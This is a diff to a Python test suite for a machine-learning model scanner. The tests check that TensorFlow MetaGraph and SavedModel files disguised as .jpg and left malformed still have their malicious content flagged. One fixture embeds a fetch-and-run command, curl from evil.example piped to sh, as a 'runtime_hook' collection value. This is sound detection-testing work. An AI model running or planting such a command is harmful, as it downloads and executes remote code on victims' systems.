@@ -73,7 +73,19 @@ def _build_benign_tf_metagraph() -> bytes:
     return cast(bytes, metagraph.SerializeToString())
 
 
-def _build_malicious_tf_savedmodel() -> bytes:
+def _build_malicious_collection_only_tf_metagraph() -> bytes:
+    import modelaudit.protos  # noqa: F401
+
+    meta_graph_pb2 = importlib.import_module("tensorflow.core.protobuf.meta_graph_pb2")
+    metagraph = meta_graph_pb2.MetaGraphDef()
+    metagraph.graph_def.versions.producer = 1
+    metagraph.collection_def["runtime_hook"].bytes_list.value.append(
+        b"python -c 'import os; os.system(\"curl https://evil.example/x | sh\")'",
+    )
+    return cast(bytes, metagraph.SerializeToString())
+
+
+def _build_malicious_tf_savedmodel(*, node_name: str = "pyfunc_node") -> bytes:
     import modelaudit.protos  # noqa: F401
 
     saved_model_pb2 = importlib.import_module("tensorflow.core.protobuf.saved_model_pb2")
@@ -81,7 +93,7 @@ def _build_malicious_tf_savedmodel() -> bytes:
     saved_model.saved_model_schema_version = 1
     metagraph = saved_model.meta_graphs.add()
     node = metagraph.graph_def.node.add()
-    node.name = "pyfunc_node"
+    node.name = node_name
     node.op = "PyFunc"
     return cast(bytes, saved_model.SerializeToString())
 
@@ -2144,6 +2156,25 @@ def test_scan_file_preserves_malicious_findings_from_malformed_renamed_tf_metagr
     assert core_module.determine_exit_code(aggregate) == 1
 
 
+def test_scan_file_preserves_collection_findings_from_malformed_renamed_tf_metagraph(tmp_path: Path) -> None:
+    disguised_metagraph = tmp_path / "collection-tail.jpg"
+    disguised_metagraph.write_bytes(_build_malicious_collection_only_tf_metagraph() + b"\xff")
+
+    result = scan_file(str(disguised_metagraph), config={"cache_scan_results": False})
+    aggregate = scan_model_directory_or_file(str(disguised_metagraph), cache_scan_results=False)
+
+    assert result.scanner_name == "tf_metagraph"
+    assert result.metadata["scan_outcome"] == "inconclusive"
+    assert METAGRAPH_PARSE_INCONCLUSIVE_REASON in result.metadata["scan_outcome_reasons"]
+    assert any(
+        issue.severity == IssueSeverity.WARNING
+        and issue.message == "Collection metadata contains command+network pattern in executable key context"
+        and issue.details.get("collection_key") == "runtime_hook"
+        for issue in result.issues
+    )
+    assert core_module.determine_exit_code(aggregate) == 1
+
+
 def test_scan_file_detects_malicious_renamed_tf_savedmodel_by_content(tmp_path: Path) -> None:
     disguised_savedmodel = tmp_path / "saved.jpg"
     disguised_savedmodel.write_bytes(_build_malicious_tf_savedmodel())
@@ -2190,6 +2221,27 @@ def test_scan_file_marks_malformed_renamed_tf_savedmodel_inconclusive_and_uncach
 def test_scan_file_preserves_malicious_findings_from_malformed_renamed_tf_savedmodel(tmp_path: Path) -> None:
     disguised_savedmodel = tmp_path / "saved-malicious-tail.jpg"
     disguised_savedmodel.write_bytes(_build_malicious_tf_savedmodel() + b"\xff")
+
+    result = scan_file(str(disguised_savedmodel), config={"cache_scan_results": False})
+    aggregate = scan_model_directory_or_file(str(disguised_savedmodel), cache_scan_results=False)
+
+    assert result.scanner_name == "tf_savedmodel"
+    assert result.metadata["scan_outcome"] == "inconclusive"
+    assert SAVEDMODEL_PARSE_INCONCLUSIVE_REASON in result.metadata["scan_outcome_reasons"]
+    assert any(
+        issue.severity == IssueSeverity.CRITICAL
+        and "PyFunc operation detected" in issue.message
+        and issue.details.get("op_type") == "PyFunc"
+        for issue in result.issues
+    )
+    assert core_module.determine_exit_code(aggregate) == 1
+
+
+def test_scan_file_preserves_nameless_malicious_findings_from_malformed_renamed_tf_savedmodel(
+    tmp_path: Path,
+) -> None:
+    disguised_savedmodel = tmp_path / "saved-nameless-malicious-tail.jpg"
+    disguised_savedmodel.write_bytes(_build_malicious_tf_savedmodel(node_name="") + b"\xff")
 
     result = scan_file(str(disguised_savedmodel), config={"cache_scan_results": False})
     aggregate = scan_model_directory_or_file(str(disguised_savedmodel), cache_scan_results=False)
